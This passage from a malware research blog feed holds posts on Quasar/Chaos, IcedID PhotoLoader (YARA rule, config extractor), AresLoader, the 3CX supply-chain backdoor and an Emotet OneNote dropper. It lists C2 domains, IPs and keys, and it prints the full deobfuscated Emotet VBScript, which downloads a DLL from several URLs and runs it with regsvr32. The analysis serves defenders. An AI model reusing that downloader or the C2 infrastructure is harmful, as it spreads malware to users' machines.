&quot;p56HD6/EQvRGDzCuDAjko6aJqVPRc/Mug3q2bslOWAZN8H2n4vy8m3x0RtwAUXh5C6kG15y+qrvsfs2s4qJHQBdKg5BmNrg62YncQ9tG5TE=&quot;, &quot;xf05S4o+UGg6gPS2slPSroORS4DLfYXnHiWz6VyhTQOpNKzIHxhEvDSTlPMFUIek3Wi3lCxroWOHJr9WeGvvHe6fxXcVPTWnPs4YiYTbmfs=&quot;, &quot;muoBJw7vz107HYcI4tyRBz0XVW2kCA367J52yCDjuHUkVGWPKkpXUgV5Q1/s4HNhSAMJDhTJwYIa3MxqdMkg7A==&quot;, &quot;B0T3cryizrl4VOcnw40TDxor8c5ycs9chw7RjsLxM2h+rS/BlcPa2ZW4po/PpJXob3byyEj4GOuWUPn+M4Shcg==&quot;] for s in strings: try: string_data_b64 = base64.b64decode(s) string_data_b64 = string_data_b64[32:] iv = string_data_b64[:16] enc_data = string_data_b64[16:] out = malduck.aes.cbc.decrypt(key, iv, enc_data) print(out) except: pass . b&#39;1.3.0.0 t t t t t t t t t&#39; b&#39;66.63.167.164:55640; x0c x0c x0c x0c x0c x0c x0c x0c x0c x0c x0c x0c&#39; b&#39; xf6H xcf xc9 x87` x96 xb7N xe7O xf1i x8d xc1 xf7&#39; b&#39;SubDir n n n n n n n n n n&#39; b&#39;Client.exe x06 x06 x06 x06 x06 x06&#39; b&#39;QSR_MUTEX_M6ajmD3hhoJo7CTsvN x04 x04 x04 x04&#39; b&#39;Quasar Client Startup x0b x0b x0b x0b x0b x0b x0b x0b x0b x0b x0b&#39; b&#39;Ransomware x06 x06 x06 x06 x06 x06&#39; b&#39;Logs x0c x0c x0c x0c x0c x0c x0c x0c x0c x0c x0c x0c&#39; .",
            "url": "https://research.openanalysis.net/quasar/chaos/rat/ransomware/2023/04/13/quasar-chaos.html",
            "relUrl": "/quasar/chaos/rat/ransomware/2023/04/13/quasar-chaos.html",
            "date": " ‚Ä¢ Apr 13, 2023"
        }
        
    
  
    
        ,"post12": {
            "title": "PhotoLoader ICEDID",
            "content": "Overview . Photoloader is the initial loader stage used to load ICEDID, . ICEDID was originally used for banking credential theft with a later pivot as a reconnaissance tool for pre-ransomware intrusions. The webinjects used for credential theft are still active though this malware is most often associated with ransomware incidents. . According to Proofpoint there is a fork of ICEDID that does not have webinject capability and is possibly developed by three separate actors... . Standard IcedID Variant ‚Äì The variant most commonly observed in the threat landscape and used by a variety of threat actors. . Lite IcedID Variant ‚Äì New variant observed as a follow-on payload in November Emotet infections that does not exfiltrate host data in the loader checkin and a bot with minimal functionality. . Forked IcedID Variant ‚Äì New variant observed by Proofpoint researchers in February 2023 used by a small number of threat actors which also delivers the bot with minimal functionality. . References . DFIRReport:ICEDID -&gt; Quantum ransomware- ICEDIDs network infrastructure is alive and well | ICEDID Configuration Extractor | Fork in the Ice: The New Era of IcedID | icedid_peloader.py | New version of IcedID Trojan uses steganographic payloads | . Samples . new loader sample (dfir report)2db4fadfb2565fd9474e4d5303f953e96ac248de3267014c32e8a669e7e600e0 UnpacMe | older sample 963397cec08790b25ff273cbe4b133634ae045d5ff8a4492e6f585f2ad14db65UnpacMe | old unpacked 32bit photoloader 1b01700425c30c2c498718966aee96cfdebacc2f6167576f7aa56e3f43ec3282 malpedia | . Analysis . It looks like the Malpedia photoloader yara rules are a bit too loose and match the newer &quot;gzip&quot; variant of the loader. The config location/encryption is different between these two loaders and photoloader has not been used in a few years. We are going to create a new rule that will be used to only match the newer variants. . Rule . This rule is heavily influenced by the elastic rules in their config extractor . rule icedid_loader { strings: $a1 = &quot;; _gat=&quot; wide fullword $a2 = &quot;; _ga=&quot; wide fullword $a3 = &quot;; _u=&quot; wide fullword $a4 = &quot;; __io=&quot; wide fullword $a5 = &quot;; _gid=&quot; wide fullword $a6 = &quot;loader_dll_64.dll&quot; ascii fullword $config_decryption1 = {45 33 C0 4C 8D 0D ?? ?? ?? ?? 49 2B C9 4B 8D 14 08 49 FF C0 8A 42 ?? 32 02 88 44 11 ?? 49 83 F8 } $config_decryption2 = { 00 42 8A 44 01 ?? 42 32 04 01 88 44 0D ?? 48 FF C1 48 83 F9 } condition: filesize &lt; 60000 and ( (3 of ($a*) and $config_decryption1) or $config_decryption2 ) } . Config Extractor . This is a modified version of the elastic config extractor . import pefile import re import struct file_data = open(&#39;/tmp/samples/963397cec08790b25ff273cbe4b133634ae045d5ff8a4492e6f585f2ad14db65&#39;, &#39;rb&#39;).read() pe = pefile.PE(data = file_data) . IMAGE_SCN_CNT_CODE = 0x00000020 def xor(data, key): out = [] for i in range(len(data)): out.append(data[i] ^ key[i % len(key)]) return bytes(out) def is_ascii(s): return all((c &lt; 128 and c &gt; 39) or c == 0 for c in s) key = None domain = None campaign_id = None mapped = False if pe.sections[0].get_data()[:100] == b&#39; x00&#39;*100: print(&quot;Mapped!&quot;) mapped = True for s in pe.sections: if (s.Characteristics &amp; IMAGE_SCN_CNT_CODE) == 0: if mapped: section_data = file_data[s.VirtualAddress:s.VirtualAddress +256] else: section_data = s.get_data() if len(section_data) &lt; 250: print(&quot;Section too small&quot;) continue # This is a hack to skip stuff that doesn&#39;t look like a key tmp_key = section_data[:32] if b&#39; x00&#39;*10 in tmp_key: print(&quot;Too many nulls in key&quot;) continue data = section_data[64:96] tmp_config = xor(data, tmp_key) domain = None try: domains = tmp_config[4:] domains = domains.split(b&quot; x00&quot;) if not is_ascii(domains[0]): continue domain = domains[0].decode(&quot;UTF-8&quot;) except: print(&quot;Domain decode error&quot;) continue if len(domain) &lt; 5: print(&quot;Domain too small&quot;) continue # If we are here we have a config! campaign_id = struct.unpack(&#39;&lt;I&#39;, tmp_config[:4])[0] key = tmp_key.hex() break assert key is not None assert domain is not None assert campaign_id is not None config = { &quot;campaign_id&quot;: campaign_id, &quot;domains&quot;: domain, &quot;key&quot;: key, } print(config) . Mapped! Too many nulls in key {&#39;campaign_id&#39;: 3581911946, &#39;domains&#39;: &#39;smockalifatori.com&#39;, &#39;key&#39;: &#39;5e845c90daccb7f15a824ddf17ebccb65094b386fa909bf6c802f42a295e5dc1&#39;} . def is_ascii(s): return all((c &lt; 128 and c &gt; 39) or c == 0 for c in s) def extract_config(file_path): file_data = open(file_path, &#39;rb&#39;).read() pe = pefile.PE(data = file_data) mapped = False if pe.sections[0].get_data()[:100] == b&#39; x00&#39;*100: #print(&quot;Mapped!&quot;) mapped = True key = None domain = None campaign_id = None try: for s in pe.sections: if (s.Characteristics &amp; IMAGE_SCN_CNT_CODE) == 0: if mapped: section_data = file_data[s.VirtualAddress:s.VirtualAddress +256] else: section_data = s.get_data() if len(section_data) &lt; 250: #print(&quot;Section too small&quot;) continue # This is a hack to skip stuff that doesn&#39;t look like a key tmp_key = section_data[:32] if b&#39; x00&#39;*10 in tmp_key: #print(&quot;Too many nulls in key&quot;) continue data = section_data[64:96] tmp_config = xor(data, tmp_key) domain = None try: domains = tmp_config[4:] domains = domains.split(b&quot; x00&quot;) if not is_ascii(domains[0]): continue domain = domains[0].decode(&quot;UTF-8&quot;) except: #print(&quot;Domain decode error&quot;) continue if len(domain) &lt; 5: #print(&quot;Domain too small&quot;) continue # If we are here we have a config! campaign_id = struct.unpack(&#39;&lt;I&#39;, tmp_config[:4])[0] key = tmp_key.hex() break assert key is not None assert domain is not None assert campaign_id is not None config = { &quot;campaign_id&quot;: campaign_id, &quot;domains&quot;: domain, &quot;key&quot;: key, } except: return {} return config # import required module import os # assign directory directory = &#39;/tmp/samples/&#39; # iterate over files in # that directory for filename in os.listdir(directory): f = os.path.join(directory, filename) # checking if it is a file if os.path.isfile(f): print(f) config = extract_config(f) print(config) . /tmp/samples/884cdf248d0235d77adc1d88603d460d64c88c517d5e571b75749be42364d6a8 {&#39;campaign_id&#39;: 3248465841, &#39;domains&#39;: &#39;qsertopinajil.com&#39;, &#39;key&#39;: &#39;e999037e2b4084f0c1284ac991eca172030d99a0fd13ad6061af36c0d26bd1c0&#39;} /tmp/samples/a2158fb6574d9d8f473eee19b6cba91f2d5c0fc5289e9245bb4d290380e22226 {&#39;campaign_id&#39;: 2615141838, &#39;domains&#39;: &#39;olifamagaznov.com&#39;, &#39;key&#39;: &#39;287130e4e0b4080bf367a2a3aaede31b5d652977f5e8a702b1c25b1afc7c2368&#39;} /tmp/samples/056de2c7a57fb4022d19398c6fc2676565afcda5e1f05ba0d91e58284e36d682 {&#39;campaign_id&#39;: 133894510, &#39;domains&#39;: &#39;restorahlith.com&#39;, &#39;key&#39;: &#39;aa677c588cb603932a4965e66ca04fbfb85784e26eb18cb73555537c554a0568&#39;} /tmp/samples/f1a6325da85adcae0b21cd02592dfc4747fbe5b4eb428dd515000e35cc4e7f47 {&#39;campaign_id&#39;: 3278418257, &#39;domains&#39;: &#39;ariopolanetyoa.com&#39;, &#39;key&#39;: &#39;7bbf03f22f1a464224f55dd9c01de97d218f26e8058e48b749ba1892293b99b1&#39;} /tmp/samples/4cda20be09dd99ab0ccf618a6c1c62122f0c484fb5925031b6ab3e7ce2f016ae {} /tmp/samples/98984bc4bd9af65911d9102bde5cae341ffb9bcc913aca1fe69093466176a058 {&#39;campaign_id&#39;: 3248465841, &#39;domains&#39;: &#39;qsertopinajil.com&#39;, &#39;key&#39;: &#39;e999037e2b4084f0c1284ac991eca172030d99a0fd13ad6061af36c0d26bd1c0&#39;} /tmp/samples/6391cf53ec2894915b2fe913913212ee074b28e8c52b2cd1039a6a1ba0b7efc0 {} /tmp/samples/963397cec08790b25ff273cbe4b133634ae045d5ff8a4492e6f585f2ad14db65_rebase.exe {&#39;campaign_id&#39;: 3581911946, &#39;domains&#39;: &#39;smockalifatori.com&#39;, &#39;key&#39;: &#39;5e845c90daccb7f15a824ddf17ebccb65094b386fa909bf6c802f42a295e5dc1&#39;} /tmp/samples/963397cec08790b25ff273cbe4b133634ae045d5ff8a4492e6f585f2ad14db65 {&#39;campaign_id&#39;: 3581911946, &#39;domains&#39;: &#39;smockalifatori.com&#39;, &#39;key&#39;: &#39;5e845c90daccb7f15a824ddf17ebccb65094b386fa909bf6c802f42a295e5dc1&#39;} /tmp/samples/e6648ec933fc75d78621f4be11b2391949c65e1822316a4d56d5ebd9a008a544 {&#39;campaign_id&#39;: 1228806356, &#39;domains&#39;: &#39;klepdrafooip.com&#39;, &#39;key&#39;: &#39;c7876ea3c330edfc2acf9d6ba61cccf08411ff1cbf69783738b072af97fe35ee&#39;} /tmp/samples/866011c18e7db2ad7203600a59f050654787aef69741b718a8f6d938260245b5 {&#39;campaign_id&#39;: 1348756909, &#39;domains&#39;: &#39;utorsabegot.com&#39;, &#39;key&#39;: &#39;5abb51b1624cf8d72e7396508290289506e3ae86106a05777692136daa1fb254&#39;} /tmp/samples/2c41811701b287107fe0e0218652eba7621988b9ee7aa1090d34679d7c62d4d0 {&#39;campaign_id&#39;: 2076641214, &#39;domains&#39;: &#39;alishabrindeader.com&#39;, &#39;key&#39;: &#39;7eca10dee216a6911fc9010b144bd46467042d0e5a8d9529ab0d3f09c94555f0&#39;} /tmp/samples/e0c14b14c0715225f710b77ed50bba269549d7bde9bf058fc30e47fe8bbe2a85 {&#39;campaign_id&#39;: 3954321778, &#39;domains&#39;: &#39;ehonlionetodo.com&#39;, &#39;key&#39;: &#39;ffe77b49c0284a4eb902e8dd15d56c910e58c78664408be3b255ff13c1c322d9&#39;} /tmp/samples/1df8dce6c6807fa52d3e655d3d29cdceff3b4e7f5c2354947e973f8174439639 {&#39;campaign_id&#39;: 3324185820, &#39;domains&#39;: &#39;druidfenixis.com&#39;, &#39;key&#39;: &#39;03b0f4ecb82527644b80fbe33f3c3c686d75a37567b5742f51ae69e0cf6b2815&#39;} /tmp/samples/244781cba0c9e5cc3763a9a8b450d0b567698ff76541bad100da2f985f115376 {&#39;campaign_id&#39;: 1228806356, &#39;domains&#39;: &#39;klepdrafooip.com&#39;, &#39;key&#39;: &#39;c7876ea3c330edfc2acf9d6ba61cccf08411ff1cbf69783738b072af97fe35ee&#39;} /tmp/samples/20d215358269e71b4f37714b209c0b2042cd2275f75ba95cc3918aabf4b004a6 {&#39;campaign_id&#39;: 2492795688, &#39;domains&#39;: &#39;greenfairsaid.com&#39;, &#39;key&#39;: &#39;02d91b9c520f7a80db3eaf20bffec772ea2de8c18d6d77b42ea46da40f5f5ebb&#39;} /tmp/samples/5179c4c9efedcb05458b624397c957608a92a4327860e913cc82fe64c5e8012e {&#39;campaign_id&#39;: 3131022508, &#39;domains&#39;: &#39;wagringamuk.com&#39;, &#39;key&#39;: &#39;ade2a8e94a5e9d004347aca5b19c7a2a07678a91fb8ed8bdad397354a999270b&#39;} /tmp/samples/966c0e03cf32173367ef2249877ccb6f9b8b549534841e435e6f2aebb047c8c8 {&#39;campaign_id&#39;: 3195585424, &#39;domains&#39;: &#39;afrodizajoy.com&#39;, &#39;key&#39;: &#39;8c0d72d85b4e23a9b62f9a0b7011c948ee20fdc7bdf3a62ef078698af877128d&#39;} /tmp/samples/1cada6c3166a8db10461cc53ac55985d646422a4c69665c2b6952719b4fc4a7f {&#39;campaign_id&#39;: 2611621973, &#39;domains&#39;: &#39;aproillionsgif.com&#39;, &#39;key&#39;: &#39;60706bb5637cf64d92711de022fdb2c6950b2f2eeedbbab35720eeadd3e9113e&#39;} /tmp/samples/17edc5bee30e951fb612f78902153189a355854aa54a2d46f14665e7dcf542cd {&#39;campaign_id&#39;: 176945684, &#39;domains&#39;: &#39;ilioskajyzi.com&#39;, &#39;key&#39;: &#39;a0298811c76505a04a34d2e43cdd95a6d0c8f5ba6276987c1f95be052cf72dea&#39;} /tmp/samples/e52d056d08d9eb9b4683e6bead0a87d13009e2602f829c4a137722e660d5397e {&#39;campaign_id&#39;: 109932505, &#39;domains&#39;: &#39;ilekvoyn.com&#39;, &#39;key&#39;: &#39;ae5c00d7b56528d2c82705a49c6511673553142bfc62fd816d35e4dd95364617&#39;} /tmp/samples/a4934907f560be76607b543bbbe18eb143a10e810d07ccf39a22717967f22da8 {&#39;campaign_id&#39;: 2611621973, &#39;domains&#39;: &#39;aproillionsgif.com&#39;, &#39;key&#39;: &#39;60706bb5637cf64d92711de022fdb2c6950b2f2eeedbbab35720eeadd3e9113e&#39;} /tmp/samples/2db4fadfb2565fd9474e4d5303f953e96ac248de3267014c32e8a669e7e600e0 {&#39;campaign_id&#39;: 2220668032, &#39;domains&#39;: &#39;alockajilly.com&#39;, &#39;key&#39;: &#39;9c721d32ebaef948d97b5c598d5d245b01f1da2eba9e034139344192534bd8a6&#39;} /tmp/samples/93fae86b3d23aeee26731a04ccac78b127000cd6d51c2f5096fb230996c8a910 {&#39;campaign_id&#39;: 1392658338, &#39;domains&#39;: &#39;nrncipalmoonw.com&#39;, &#39;key&#39;: &#39;80b33f829e0b667861e6e5efac3825b7751a6e27e326796e62c8f4147176e064&#39;} /tmp/samples/c139cc51b09e6a0c0415b665c3cec704299cca185f5f7c9e239bdf82e3911245 {&#39;campaign_id&#39;: 1732687004, &#39;domains&#39;: &#39;keepfootbal.com&#39;, &#39;key&#39;: &#39;9c8f084e492b44179c83e50fb2ec25d644429ea9f67060fa0d4962c3a85c3808&#39;} /tmp/samples/b44eb70fc9830829c73d92b510756df55e0fe0f1be15ec6a12f18517a3147603 {&#39;campaign_id&#39;: 2546188793, &#39;domains&#39;: &#39;anisiderblomm.com&#39;, &#39;key&#39;: &#39;40811aaff35e3c0330a698ed3c0b353e1395ae6301b3edaf4a99a09953580fef&#39;} .",
            "url": "https://research.openanalysis.net/icedid/bokbot/photoloader/config/2023/04/06/photoloader.html",
            "relUrl": "/icedid/bokbot/photoloader/config/2023/04/06/photoloader.html",
            "date": " ‚Ä¢ Apr 6, 2023"
        }
        
    
  
    
        ,"post13": {
            "title": "AresLoader",
            "content": ". Overview . AresLoader is a new malware downloader that has been advertised on some underground forums. . References . New loader on the bloc - AresLoader | Private Malware for Sale: A Closer Look at AresLoader | . Samples . 7572b5b6b1f0ea8e857de568898cf97139c4e5237b835c61fea7d91a6f1155fb UnpacMe | . Panels . The following were live panels at the time of analysis (thanks @lloydlabs) . 45.80.69[.]193 37.220.87[.]52 . Note From The Developers . From the the developers themselves! . Dear Customer. Here will be described the advantages, the rules of using the lowers you are renting. Product name: AresLoader. Monthly lease will cost $300. There are no discounts provided. Price includes: 5 rebuilds ( including the first one ), each with a partial stub cleanup ( uniqueization of the binary signature ). Any rebuild after that will cost $50, and this may take some time, since this service is manual, but we will not keep you waiting. In addition, manual morphing code (for each build it is different). ============================== The way AresLoader works is that it presents itself as legitimate software (not a required feature) and then downloads the payload and puts it on the disk wherever you want. Before launching the payload, Ares launches a legitimate file. AresLoader can ask the user admin rights (until he allows it) on behalf of cmd.exe and afterwards transfer the rights from cmd.exe to the payload. Ares supports the ability to load encrypted payloads using AES/RSA ciphers ( only use your own encoder to avoid decryption problems ) For more details about the work and functionality of the builder - contact the team, we are ready to answer any question. As the builder is in the form of a constructor, they can arise. Due to the fact that the Lauder will be improved and we will be introducing different updates, they may be free or for a fee. In any case, we will notify you about updates and explain what and where they will be updated/modernized. =============================== There are rules for use. Attempts to change or break them will be treated critically, up to and including blocking the user. 1. Resale of license is FORBIDDEN. 2. We are not responsible for any loss to the renter. 4. It is forbidden to post the Lowder binary file in the public domain. 5. It is forbidden to upload the loeder to Virus Total. For our part, the Development team is ready to ensure the comfortable use of our product. Soon we will be adding new updates and other additions to the functionality to improve the performance, increasing the potential of using our AresLoader. In case of any questions we are ready to get in touch with you at any convenient time and solve any arising problems. We are looking for long-term cooperation and diligent customers. Sincerely, developers. . Analysis . The first stage is &quot;packed&quot; with fake API calls used to obscure a simple shellcode loader. The loader loads the 2nd stage onto the heap and executes it (yes you read the right, the heap). . Stage 2 . The 2nd stage uses a custom decryption algorithm to decrypt the final stage which is loaded into a RWX section and executed. The decryption algorithm was previously observed in a malware dubbed BUGHATCH by elastic. The overlap between the two malware families is currently unclear. . Stage 3 . The 3rd and final stage is composed of some shellcode and the AresLoader payload PE file. The shellode is used to execute the PE file. . Based on the strings in the payload this sample is .... AresLdr_v_3 . The 3rd stage appears to have been around since at least 2021 in some form as this analysis report describes a most of the same functionality Anatomy of a simple and popular packer. . The purpose of the loader is to download and launch a final malware payload (technically making this a downloader not a loader). The download URLs are in plain text in the final stage and the payload is executed via CreateProcessA. .",
            "url": "https://research.openanalysis.net/ares/aresloader/loader/2023/04/02/aresloader.html",
            "relUrl": "/ares/aresloader/loader/2023/04/02/aresloader.html",
            "date": " ‚Ä¢ Apr 2, 2023"
        }
        
    
  
    
        ,"post14": {
            "title": "3CX Supply Chain Attack",
            "content": ". Overview . From the Volexity post . CrowdStrike identified signed 3CX installation files as being malicious and reported that customers were seeing malicious activity emanating from the ‚Äú3CXDesktopApp‚Äù. . 3CX is client software for VOIP phones, that was delivered to targets with a backdoor. The backdoored application was delivered in an MSI 3CXDesktopApp-18.12.416.msi which is signed by a valid certificate belonging to 3Cx Ltd. . References . 3CX Supply Chain Compromise Leads to ICONIC Incident- CrowdStrike Falcon Platform Detects and Prevents Active Intrusion Campaign Targeting 3CXDesktopApp Customers | SmoothOperator | Ongoing Campaign Trojanizes 3CXDesktopApp in Supply Chain Attack | . Samples . 3CXDesktopApp-18.12.416.msi 59e1edf4d82fae4978e97512b0331b7eb21dd4b838b850ba46794d9c7a2c0983 | icon15.ico f47c883f59a4802514c57680de3f41f690871e26f250c6e890651ba71027e4d3 | . Analysis . Let&#39;s take a look at the .msi and see what is in there, we can just use 7zip to unzip it. Inside the .msi we have a backdoored file ffmpeg.dll . Stage 1 ffmpeg.dll . Artifacts . ffmpeg.dll 7986bbaee8940da11ce089383521ab420c443ab7b15ed42aed91fd31ce833896 | d3dcompiler_47.dll 11be1803e2e307b647a8a7e02d128335c448ff741bf06bf52b332e0bbf423b03 | . Functionality . Uses CreateEventW with the string AVMonitorRefreshEvent like a mutex to ensure it is only running once | Gets its process path (file location) to locate d3dcompiler_47.dll which it expects to be in the same directory | Scans d3dcompiler_47.dll for the magic hex bytes 0xFEEDFACE | The magic bytes 0xFEEDFACE occur twice in a row | All the file data following the magic bytes is decrypted with RC4 using the hard coded key 3jB(2bsG#@c7 | Once decrypted the data contains shellcode followed by an embedded PE file (Stage 2) which is loaded into memory and executed | . Signed DLL . The d3dcompiler_47.dll DLL is signed by Microsoft. The 0xFEEDFACE magic bytes suggest that the open source tool SigFlip was used to patch the authenticode signed PE file without breaking the signature. . Stage 2 . Artifacts . Shellcode with stage 2 PE attached b56279136d816a11cf4db9fc1b249da04b3fa3aef4ba709b20cdfbe572394812 | . Functionality . Creates a file called manifest in the directory from which the process was launched | The manifest file is used to maintain a delay timer value for the malware | The delay is calculated by adding 7 days to a randomly generated value between 0 days and 20 days, 20 hours for a total potential delay of between 7 days, and 20 days 20 hours | When the malware executes this value is read from the manifest file and checked against the system time, if the time has not expired the malware will simply sleep | The MachineGuid key value is read from the registry key Software Microsoft Cryptography then transformed into the following &quot;cookie&quot; value to be used in future C2 requests | . _tutma=xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxx . A random number generator is used to build a variation of the following URL with an icon file between icon1.ico and icon16.ico (either I&#39;m not reading the code right or this is an off-by-one error as the icon files are number 0-15?) | . https[:]//raw.githubusercontent[.]com/IconStorages/images/main/icon%d.ico . The icon file is downloaded from GitHub and parsed to extract encoded data that is appended to the file | The appended data is preceded by a $ which the malware uses as a marker to identify it | The following is an example of the bas64 encoded data in icon15.ico | . `KQAAAGVhV4u+Eo4SGUuZypP8kNOkwQWzha6sxQrtzFo3oPSejc470WC47cKqv12+CshijG0HCfex40WinKat68EHqq8i6lHiifZpsxN3lxBRabtJ` . The data is then base64 decoded and passed through an unidentified generator used to create a key for the data | The key is then used to decrypt the remaining data using AES | Once decrypted the data reveals the stage2 C2 URL https[:]//pbxsources[.]com/exchange, each icon file contains a different URL | A request is then sent to the C2 using the _tutma cookie described above and stage 3 is downloaded | . Stage 3 was not recovered .",
            "url": "https://research.openanalysis.net/3cx/northkorea/apt/triage/2023/03/30/3cx-malware.html",
            "relUrl": "/3cx/northkorea/apt/triage/2023/03/30/3cx-malware.html",
            "date": " ‚Ä¢ Mar 30, 2023"
        }
        
    
  
    
        ,"post15": {
            "title": "OneNote WSF Malware (Emotet)",
            "content": "Overview . Recently Emotet has been using OneNote files as their pre-binary dropper/downloader. The delivery chain appears to be... . OneNote | Embeded WSF file | Download DLL (Emotet first stage) | . Our goal will be to construct a full static IOC extraction tool for these files! . . Sample . 1c3a7f886a544fc56e91b7232402a1d86282165e2699b7bf36e2b1781cb2adc2 Malshare . References . OneDump python tool from Didier &lt;3 | pyOneNote python tool | OneNote ref docs (pdf) | . OneNote File Format . OneNote files use the file extension .one | These documents can contain other files (similar to a .doc file or .xls) Not sure if there are limits to the types of files that can be included but .wsf files can be included | . | The current method used to trick users into executing these embedded files is to place them &quot;under&quot; an image that request the user double click for some reason... the double click will then be passed on to the embedded file. Because these files are launched using a &quot;double click&quot; they must have a valid file extension (note for defenders) | . | . Analysis . Extract all embedded files from OneNote document | Search for executable file extensions on extracted files | Triage these files | . OneNote Triage . inside of onenote is a .wsf file which contains an obfuscated script | replacing the execute command with a simple file print we get the deobfuscated script | . urlcount=1 set fsobject=createobject(&quot;scripting.filesystemobject&quot;) currentdir=fsobject.getparentfoldername(wscript.scriptfullname) set request=createobject(&quot;winhttp.winhttprequest.5.1&quot;) set file=wscript.createobject(&quot;shell.application&quot;) set strout=createobject(&quot;adodb.stream&quot;) useragent=&quot;mozilla/5.0 (windows nt 6.1; wow64; rv:58.0) gecko/20100101 firefox/58.0&quot; ouch= chr(115-1)+&quot;e&quot;+&quot;gs&quot;&amp;&quot;v&quot;+chr(113+1)+&quot;3&quot;+&quot;2.&quot;+chr(101)+&quot;x&quot;+chr(101)+&quot; &quot; + &quot;&quot; pat3= currentdir+&quot; &quot;+fsobject.gettempname+&quot;.dll&quot; loiu=ouch+ &quot;&quot;&quot;&quot;+ pat3 + &quot;&quot;&quot;&quot; set triplett=createobject(&quot;wscript.shell&quot;) url1 = &quot;https://penshorn.org/admin/Ses8712iGR8du/&quot; url2 = &quot;https://bbvoyage.com/useragreement/ElKHvb4QIQqSrh6Hqm/&quot; url3 = &quot;https://www.gomespontes.com.br/logs/pd/&quot; url4 = &quot;https://portalevolucao.com/GerarBoleto/fLIOoFbFs1jHtX/&quot; url5 = &quot;http://ozmeydan.com/cekici/9/&quot; url6 = &quot;http://softwareulike.com/cWIYxWMPkK/&quot; url7 = &quot;http://wrappixels.com/wp-admin/GdIA2oOQEiO5G/&quot; do call dow loop while urlcount&lt;8 public function dow() on error resume next select case urlcount case 1 downstr=url1 case 2 downstr=url2 case 3 downstr=url3 case 4 downstr=url4 case 5 downstr=url5 case 6 downstr=url6 case 7 downstr=url7 end select request.open &quot;get&quot;,downstr,false request.send If Err.Number&lt;&gt;0 then urlcount=urlcount+1 else strout.open strout.type=1 if vare=0 then cad=1 else far=2 end if strout.write (request.responsebody) if roum=0 then sio=sio+1 else end if strout.savetofile pat3 strout.close armour = &quot;samcom.&quot; set fsobject=createobject(&quot;scripting.filesystemobject&quot;) Set f = fsobject.GetFile(pat3) GetFileSize = clng(f.size/1024) If GetFileSize &gt; 150 Then call roize urlcount = 8 else pat3= currentdir+&quot; &quot;+fsobject.gettempname+&quot;.dll&quot; loiu=ouch+ &quot;&quot;&quot;&quot;+ pat3 + &quot;&quot;&quot;&quot; urlcount=urlcount+1 end if end if end function public function roize if derti=0 then sem=sem+1 else end if urlcount = 8 triplett.run (loiu),0,true cor = &quot;samo&quot; set fsobject=createobject(&quot;scripting.filesystemobject&quot;) set textstream = fsobject.createtextfile(&quot;&quot;+wscript.scriptfullname+&quot;&quot;) textstream.write (&quot;badum tss&quot;) if rotate = 12 then sable = 54 + 22 else routtt = &quot;carry&quot; end if end function . Emulation? . Instead of running this live and modifying the script, can we get away with emulating wscript.exe and running the script in an emulator? . Some Thoughts on Emulation . We want to dump early enough that we can modify the script code before it is parsed | We want to dump late enough that most of the setup is done and we don&#39;t have to implement much in dumpulator | Currently we are having some issues with the sweet spot for a dump because wscript -&gt; scobj and scobj uses an abstraction to implement the parser | When we dump before the parser we still have some thread stuff causing issues (maybe not fixable???) | TODO: look into vbscript (without wscript wrapper) is it simpler?? | . Taking A Closer Look a The Scripting Engine . We want a way to run vbs/wsf scripts and dump each deobfuscated script stage (or atleast each stage assuming it will be less obfuscated than the last). . We know that wscript . References . amsi-trace | AMSIScriptContentRetrieval.ps1 | Antimalware Scan Interface Detection Optics Analysis Methodology: Identification and Analysis of AMSI for WMI | API Monitor | . Background . For JScript the solution is much simpler as we can rely on the underlying javascript NODE engine to do the heavy lifting and implement the JScript specific objects/calls malware-jail wscript emulator (jscript only) | For VBscript there is no good solution as there is no &quot;basic&quot; script engine that we can rely on. | For VBscript we are going to try to doe this dynamically Instrument the wscript.exe binary and take a look at what function are used to &#39;execute&#39; new scripts dynamically | We can also take a look at the AMSI events and see if this is done for us? | . | . cscript.exe . We are using cscript to launch our test VBS script with the following setup (32bit for ease of debugging). . &quot;C: Windows SysWOW64 cscript.exe&quot; c: users admin desktop test.vbs . We are starting with .vbs instead of .wsf to eliminate any additional complexity (wsf is sent to an XML parser first for the header, etc.) . Script State . From a high level we can start by breaking on this (callback?) CScriptingEngine::OnStateChange(enum tagSCRIPTSTATE) . enum tagSCRIPTSTATE { SCRIPTSTATE_UNINITIALIZED = 0x0, SCRIPTSTATE_INITIALIZED = 0x5, SCRIPTSTATE_STARTED = 0x1, SCRIPTSTATE_CONNECTED = 0x2, SCRIPTSTATE_DISCONNECTED = 0x3, SCRIPTSTATE_CLOSED = 0x4, }; . This gives us a convenient place to break and investigate the script before it has been passed to the script engine. . vbscript.dll . Our first focus in the actual scripting engine is the Antimalware Script Interface (AMSI) component which parses the script before it is actually run and sends events to AMSI. . JAmsiProcessor . JAmsi::JAmsiProcessor(struct IDispatch *, long, struct tagDISPPARAMS *, class CSession *) . The JAmsiProcessor is actually called for each &quot;execution&quot; of a script (so keywords within a running script will trigger it). The main purpose appears to be to parse the script into command tokens then hash the token (ex. echo) with a version of CRC32 (seed=0xffffffff, inverted result) and then compare the hashes against known values used to trigger AMSI events. . Script Excution . The following is an example call stack for an executed script. . COleScript::ExecutePendingScripts CSession::Execute CScriptEntryPoint::Call CScriptRuntime::Run CScriptRuntime::RunNoEH . Following the flow (thank you @mishap ... . VbsExecute-&gt;rtEval and then it recurses back into CScriptEntryPoint::Cal . CSession::Execute | CScriptEntryPoint::Call | Setting up script CScriptRuntime::Run | - CScriptRuntime::RunNoEH | Parses over the script --&gt;VbsExecute | Hit execute keyword | rtEval | Evaluates execute args | CScriptEntryPoint::Call | | CScriptRuntime::Run | Recursive call back to parser CScriptRuntime::RunNoEH | - . Based on this we can break on VbsExecute and observe any scripts that are being executed. . struct IEntryPoint *__stdcall VbsExecute(struct VAR *a1, int a2, execute_data *arg_data) . We have not fully reversed the structure of the arguments but the following is a start (it is wrong in some cases!!) . struct execute_data { DWORD d0; DWORD d1; wchar_t *code; }; . ** This is the x64dbg log statement we were using for a breakpoint on VbsExecute . {utf16@[[esp+0xc] + 8]} . Instrumenting VBscript . Also thanks to @mishap we dug further and discovered that rtEval is called with the contents of the script to be executed so we can break on this instead and pull the script (wide string) from ECX (fastcall). . struct IEntryPoint *__fastcall rtEval(unsigned __int16 *a1, struct IEntryPoint *a2, int a3, int a4) . The following is all we need in x64dbg to log all executed scripts with a breakpoint on this function {utf16@ecx} . Dumpulator Emulation! . Now that we have a better place to dump we can try this again. . Run a test script that includes execute until a bp on rtEval is hit | Dump | Load in Dumpulator | ECX contains a pointer to the script (wide string) | Place Dumpulator bp on rtEval | Replace this script with the target script in dumpulator and run | When the 